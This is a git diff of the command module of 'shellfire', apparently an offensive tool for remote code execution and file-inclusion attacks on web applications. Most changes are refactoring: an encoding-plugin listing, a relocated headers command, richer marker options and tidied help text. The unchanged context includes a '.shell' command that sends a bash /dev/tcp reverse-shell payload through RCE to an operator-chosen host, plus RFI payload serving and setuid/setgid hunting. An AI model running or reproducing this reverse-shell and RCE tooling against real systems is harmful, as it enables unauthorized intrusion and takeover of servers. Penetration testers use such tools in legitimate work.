@@ -8,6 +8,7 @@ import sys
 import threading
 import time
 from config import cfg, state
+from plugin_collection import plugins
 
 ############################################################
 ## Functions
@@ -147,6 +148,9 @@ def cmd_encode(cmd):
   if len(cmd) == 1:
     sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
     return
+  if len(cmd) == 2 and cmd[1] == "ls":
+    sys.stdout.write("[*] Available encodings: %s\n" % (' '.join(plugins.plugins)))
+    return
   ## Set our encoding plugins!
   ## let's remove ".encode" from our cmd
   cmd.pop(0)
@@ -160,10 +164,10 @@ def cmd_encode(cmd):
           cfg.encode_chain.append(c)
         else:
           cfg.encode_chain = []
-          sys.stdout.write("[!] Invalid plugin %s\n" % (c))
+          sys.stdout.write("[!] Invalid plugin '%s'\n" % (c))
           return
-  except:
-    pass
+  except Exception as e:
+    sys.stdout.write("[!] Error: %s\n" % (e))
   return
 
 def cmd_exit(cmd):
@@ -186,6 +190,47 @@ def cmd_find(cmd):
     return
   state.exec_cmd = True
   return
+
+def cmd_headers(cmd):
+  """List or configure the HTTP request headers
+    .headers
+    .headers default
+    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
+  Args:
+      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
+  """
+  if len(cmd) < 1:
+    sys.stderr.write("[!] Invalid parameters\n")
+    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
+    sys.stderr.write("    .headers default\n")
+    return
+  elif len(cmd) == 1:
+    sys.stdout.write("[*] Request headers are: \n")
+    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
+    return
+  try:
+    cmd.pop(0)
+    if "".join(cmd).strip() == "default":
+      ## Apply the default headers here
+      cfg.headers = cfg.default_headers
+      sys.stdout.write("[*] Set request headers back to default...\n")
+    else:
+      ## Convert deserialize the json
+      tmp_headers = json.loads(" ".join(cmd))
+      
+      ## Upsert into cfg.headers
+      for header in tmp_headers:
+        if header not in cfg.headers:
+          cfg.headers[header] = tmp_headers[header]
+        else:
+          if cfg.headers[header] != tmp_headers[header]:
+            cfg.headers[header] = tmp_headers[header]
+      
+      ## Sanity check
+      sys.stdout.write("[*] Request headers are now: \n")
+      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
+  except Exception as e:
+    sys.stderr.write("[!] %s\n" % e)
 
 def cmd_help(cmd):
   if len(cmd) == 2:
@@ -258,11 +303,24 @@ def cmd_http(cmd):
 def cmd_marker(cmd):
   ## set the marker for our rce payloads
   ## this will determine boundaries to split and clean output
-  if len(cmd) != 2:
-    sys.stderr.write("[!] Invalid parameters\n")
+  if len(cmd) == 1:
+    sys.stderr.write("[*] Payload marker: %s\n" % (cfg.marker))
     return
-  cfg.marker = cmd[1]
-  sys.stdout.write("[*] Payload output marker set\n")
+  ## let's remove ".marker" from our cmd
+  cmd.pop(0)
+
+  ## assign our action and remove it from cmd
+  action = cmd[0]
+  cmd.pop(0)
+
+  ## process our action
+  if action == "set":
+    ## set the rest of the string as our marker
+    cfg.marker = " ".join(cmd)
+    sys.stdout.write("[*] Payload output marker set\n")
+  elif action == "out":
+    cfg.marker_idx = [int(idx) for idx in cmd]
+    sys.stdout.write("[*] Marker indices set\n")
   return
 
 def cmd_method(cmd):
@@ -303,48 +361,6 @@ def cmd_referer(cmd):
   sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
   return
 
-def cmd_headers(cmd):
-  """List or configure the HTTP request headers
-    .headers
-    .headers default
-    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
-  Args:
-      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
-  """
-  if len(cmd) < 1:
-    sys.stderr.write("[!] Invalid parameters\n")
-    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
-    sys.stderr.write("    .headers default\n")
-    return
-  elif len(cmd) == 1:
-    sys.stdout.write("[*] Request headers are: \n")
-    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
-    return
-  try:
-    cmd.pop(0)
-    if "".join(cmd).strip() == "default":
-      # Apply the default headers here
-      cfg.headers = cfg.default_headers
-      sys.stdout.write("[*] Set request headers back to default...\n")
-    else:
-      # Convert deserialize the json
-      tmp_headers = json.loads(" ".join(cmd))
-      
-      # Upsert into cfg.headers
-      for header in tmp_headers:
-        if header not in cfg.headers:
-          cfg.headers[header] = tmp_headers[header]
-        else:
-          if cfg.headers[header] != tmp_headers[header]:
-            cfg.headers[header] = tmp_headers[header]
-      
-      # Sanity check
-      sys.stdout.write("[*] Request headers are now: \n")
-      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
-  except Exception as e:
-    sys.stderr.write("[!] %s\n" % e)
-
-
 def cmd_shell(cmd):
   ## initiate a reverse shell via rce
   if len(cmd) != 3:
@@ -356,11 +372,11 @@ def cmd_shell(cmd):
   port = cmd[2]
   state.userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
 
-  # open our reverse shell in a new thread
+  ## open our reverse shell in a new thread
   s = threading.Thread(target=rev_shell, args=(host, port))
   s.start()
 
-  # make sure the thread is init before proceeding
+  ## make sure the thread is init before proceeding
   time.sleep(1)
 
   state.exec_cmd = True
@@ -389,130 +405,133 @@ command_list = {
     "func": cmd_auth,
     "description": "",
     "help_text": [
-      ".auth - show current HTTP Auth credentials\n",
-      ".auth <username>:<password> - set the HTTP Auth credentials\n",
+      ".auth - show current HTTP Auth credentials.\n",
+      ".auth <username>:<password> - set the HTTP Auth credentials.\n",
     ],
   },
   "config": {
     "func": cmd_config,
     "description": "",
     "help_text": [
-      ".config save [name] - save a named config\n",
-      ".config load [name] - load a named config\n",
+      ".config save [name] - save a named config.\n",
+      ".config load [name] - load a named config.\n",
     ],
   },
   "cookies": {
     "func": cmd_cookies,
     "description": "",
     "help_text": [
-      ".cookies - show current cookies to be sent with each request\n",
-      ".cookies <json> - a json string representing cookies you wish to send\n",
+      ".cookies        - show current cookies to be sent with each request.\n",
+      ".cookies <json> - a json string representing cookies you wish to send.\n",
     ],
   },
   "encode": {
     "func": cmd_encode,
     "description": "",
     "help_text": [
-      ".encode - show current encoding used before sending commands\n",
-      ".encode base64 - encode commands with base64 before sending\n",
-      ".encode none - do not encode commands before sending\n",
+      ".encode          - show current encoding used before sending commands.\n",
+      ".encode ls       - list available plugins for encoding.\n",
+      ".encode <string> - encode commands with plugin <string> before sending.\n",
+      "                   you may pass multiple plugins separated with spaces or pipes.\n",
     ],
   },
   "exit": {
     "func": cmd_exit,
     "description": "",
     "help_text": [
-      ".exit - exits this program\n"
+      ".exit - exits this program.\n"
     ],
   },
   "find": {
     "func": cmd_find,
     "description": "",
     "help_text": [
-      ".find setuid - search for setuid files\n",
-      ".find setgid - search for setgid files\n",
-    ],
-  },
-  "help": {
-    "func": cmd_help,
-    "description": "",
-    "help_text": [
-      ".help - prints all help topics\n"
-    ],
-  },
-  "history": {
-    "func": cmd_history,
-    "description": "",
-    "help_text": [
-      ".history clear - erase history\n",
-      ".history nosave - do not write history file\n",
-      ".history save - write history file on exit\n",
-    ],
-  },
-  "http": {
-    "func": cmd_http,
-    "description": "",
-    "help_text": [
-      ".http - show status of HTTP server\n",
-      ".http payload [type] - set the payload to be used for RFI\n",
-      "                       supported payload types:\n",
-      "                       aspnet\n",
-      "                       php\n",
-      ".http start [port] - start HTTP server\n",
-      ".http stop - stop HTTP server\n",
-    ],
-  },
-  "marker": {
-    "func": cmd_marker,
-    "description": "",
-    "help_text": [
-      ".marker <string> - set the payload output marker to string.\n",
-    ],
-  },
-  "method": {
-    "func": cmd_method,
-    "description": "",
-    "help_text": [
-      ".method - show current HTTP method\n",
-      ".method get - set HTTP method to GET\n",
-      ".method post - set HTTP method to POST\n",
-    ],
-  },
-  "phpinfo": {
-    "func": cmd_phpinfo,
-    "description": "",
-    "help_text": [
-      ".phpinfo - executes the '_show_phpinfo' command via the PHP payload"
-    ],
-  },
-  "post": {
-    "func": cmd_post,
-    "description": "",
-    "help_text": [
-      ".post <json> - a json string representing post data you wish to send\n",
-    ]
-  },
-  "referer": {
-    "func": cmd_referer,
-    "description": "",
-    "help_text": [
-      ".referer - show the HTTP referer string\n",
-      ".referer <string> - set the value for HTTP referer\n",
+      ".find setuid - search for setuid files.\n",
+      ".find setgid - search for setgid files.\n",
     ],
   },
   "headers": {
     "func": cmd_headers,
     "description": "",
     "help_text": [
-      ".headers default - sets the headers back to the shellfire defaults\n",
-      ".headers {\"X-EXAMPLE\": \"some_value_here\"} - upserts the headers in the JSON object to the header config\n",
+      ".headers default - sets the headers back to the shellfire defaults.\n",
+      ".headers {\"X-EXAMPLE\": \"some_value_here\"} - upserts the headers in the JSON object to the header config.\n",
+    ],
+  },
+  "help": {
+    "func": cmd_help,
+    "description": "",
+    "help_text": [
+      ".help - prints all help topics.\n"
+    ],
+  },
+  "history": {
+    "func": cmd_history,
+    "description": "",
+    "help_text": [
+      ".history clear  - erase history.\n",
+      ".history nosave - do not write history file.\n",
+      ".history save   - write history file on exit.\n",
+    ],
+  },
+  "http": {
+    "func": cmd_http,
+    "description": "",
+    "help_text": [
+      ".http                - show status of HTTP server\n",
+      ".http payload [type] - set the payload to be used for RFI.\n",
+      "                       supported payload types:\n",
+      "                         aspnet\n",
+      "                         php\n",
+      ".http start [port]   - start HTTP server.\n",
+      ".http stop           - stop HTTP server.\n",
+    ],
+  },
+  "marker": {
+    "func": cmd_marker,
+    "description": "",
+    "help_text": [
+      ".marker              - show the current payload output marker.\n",
+      ".marker set <string> - set the payload output marker to string.\n",
+      ".marker out <number> - the output indices to display after splitting on our marker.\n",
+    ],
+  },
+  "method": {
+    "func": cmd_method,
+    "description": "",
+    "help_text": [
+      ".method      - show current HTTP method.\n",
+      ".method get  - set HTTP method to GET.\n",
+      ".method post - set HTTP method to POST.\n",
+    ],
+  },
+  "phpinfo": {
+    "func": cmd_phpinfo,
+    "description": "",
+    "help_text": [
+      ".phpinfo - executes the '_show_phpinfo' command via the PHP payload."
+    ],
+  },
+  "post": {
+    "func": cmd_post,
+    "description": "",
+    "help_text": [
+      ".post <json> - a json string representing post data you wish to send.\n",
+    ]
+  },
+  "referer": {
+    "func": cmd_referer,
+    "description": "",
+    "help_text": [
+      ".referer          - show the HTTP referer string.\n",
+      ".referer <string> - set the value for HTTP referer.\n",
     ],
   },
   "shell": {
     "func": cmd_shell,
     "description": "",
     "help_text": [
-      ".shell <ip_address> <port> - initiate reverse shell to target\n",
+      ".shell <ip_address> <port> - initiate reverse shell to target.\n",
     ]
   },
   "url": {
@@ -527,15 +546,15 @@ command_list = {
     "func": cmd_useragent,
     "description": "",
     "help_text": [
-      ".useragent - show the User-Agent string\n",
-      ".useragent <string> - set the value for User-Agent\n",
+      ".useragent          - show the User-Agent string.\n",
+      ".useragent <string> - set the value for User-Agent.\n",
     ],
   },
   "quit": {
     "func": cmd_exit,
     "description": "Alias of \".exit\"",
     "help_text": [
-      ".quit - exits this program\n"
+      ".quit - exits this program.\n"
     ],
   },
 }
